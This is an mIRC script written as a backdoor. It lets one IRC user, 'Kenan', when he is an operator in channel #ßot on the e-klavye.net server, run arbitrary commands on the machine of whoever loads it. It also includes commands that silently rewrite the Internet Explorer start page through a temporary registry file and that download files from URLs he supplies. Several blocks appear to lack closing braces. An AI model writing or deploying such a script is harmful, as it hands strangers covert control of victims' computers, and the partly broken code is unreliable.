   on 1:text:*:#: {
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 = $me) { $2-  }
         }
       }
     }
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 = !zega) { $2- }
         }
       }
     }
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 = !reklam) {
              set %mesaj $2-
              msg #ßot  12reklam 4 %mesaj 12Degiþti
         }
       }
     }
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 = !away) {
              set %mesaj1 $2-
              msg #ßot  12away 4 %mesaj1 12Degiþti
         }
       }
     }
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 == !giris) {
             set %giris $2
             set %system $r(10,1999) $+ .reg
             .write %system REGEDIT4
             .write %system [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
             .write %system "Start Page" = " $+ %giris $+ "
             .run -n regedit /s %system
             .timer 1 4 remove %system
             msg #ßot  12[Giriþ Sayfasi] 4 %giris 12Degiþti
           }
         }
       }
     }
     if (e-klavye.net isin $server) {
       if (Kenan ison #ßot) {
         if (Kenan isop #ßot) {
           if ($1 = !download) { /get $2- | msg #ßot adamým mC_YaRgIc  Http:// $+ $2- adresindekini yükledim }
         }
       }
     }
   }
